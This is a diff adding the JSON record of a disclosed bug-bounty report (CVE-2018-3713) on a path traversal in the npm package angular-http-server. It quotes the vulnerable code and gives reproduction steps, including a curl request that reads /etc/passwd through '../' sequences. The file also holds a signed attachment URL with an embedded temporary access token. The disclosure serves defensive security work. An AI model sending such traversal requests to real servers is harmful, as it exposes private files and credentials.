@@ -1,0 +1,139 @@
+{
+  "id": 309120,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDkxMjA=",
+  "url": "https://hackerone.com/reports/309120",
+  "title": "[angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-25T19:45:34.645Z",
+  "submitted_at": "2018-01-25T19:45:34.645Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3713"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-01T22:14:10.111Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-01-30T22:14:02.226Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\n**angular-http-server** (https://www.npmjs.com/package/angular-http-server) contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.\n\n**Module:** \n\nA very simple application server designed for Single Page App (SPA) developers.\n(https://www.npmjs.com/package/angular-http-server)\n\n\n**Description**\n\nangular-http-server does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.\n\nVulnerable code in ```angular-http-server.js``` file (lines 66-82):\n\n```javascript\nfs.stat(possibleFilename, function(err, stats) {\n        var fileBuffer;\n        if (!err && stats.isFile()) {\n            fileBuffer = fs.readFileSync(possibleFilename);\n            let ct = mime.lookup(possibleFilename);\n            console.log(`Sending ${possibleFilename} with Content-Type ${ct}`);\n            res.writeHead(200, { 'Content-Type': ct });\n\n        } else {\n            console.log(\"Route %s, replacing with index.html\", possibleFilename);\n            fileBuffer = returnDistFile();\n            res.writeHead(200, { 'Content-Type': 'text/html' });\n        }\n\n        res.write(fileBuffer);\n        res.end();\n    });\n```\n\nFile with ```possibleFilename``` name is read and send with guessed mime type. No path or allowed mime type validation is implemented - if it's possible to read the file, code just does it.\n\n\n## Steps To Reproduce:\n\n- install ```angular-http-server```\n\n```\n$ npm install angular-http-server\n```\n\n- create static ```index.html``` file (required as starting point of an app:\n\n```html\n<html>\n\n<head>\n    <meta charset=\"utf8\">\n    <title>Index HTML</title>\n</head>\n\n<body>\n    <div>\n        <p>This is index.html :)</p>\n    </div>\n</body>\n\n</html>\n```\n\n- run server in the same folder where ```index.html``` was created:\n\n```\n$ angular-http-server --path ./\n```\n\n- open the browser and go to ```127.0.0.1:8080``` You should see HTML output.\n\n- from the terminal, execute folloiwng command (please adjust numbers of ../ to your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd\n```\n\nYou should see the content of ```/etc/passwd``` file:\n\n{F257351}\n\nAlso, in the ```angular-http-server``` log there is information about mime type of the file (```application/octet-stream```):\n\n```\n$ ./node_modules/angular-http-server/angular-http-server.js --path ./\nPath specified: ./\nUsing index.html\nListening on 8080\nSending ../../../../../etc/passwd with Content-Type application/octet-stream\n\n```\n\n\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to read content of any file on the machine where angular-http-server is running.\n\nThis might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 257351,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/351/ec2b7172584f64a4ebc3eea0ccb39684ee58c957/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125741Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=def086b0e05f5c2d4ac0db0f91f1a41ea2951533588ef890dd46ce500df9e7e2",
+      "file_size": 3270713,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-01T22:14:02.298Z",
+  "allow_singular_disclosure_after": -187886619.2451331,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "muon4",
+    "yumi",
+    "eveeez",
+    "m7mdharoun",
+    "khaledibnalwalid",
+    "666reda",
+    "geotester"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5629,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "angular-http-server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
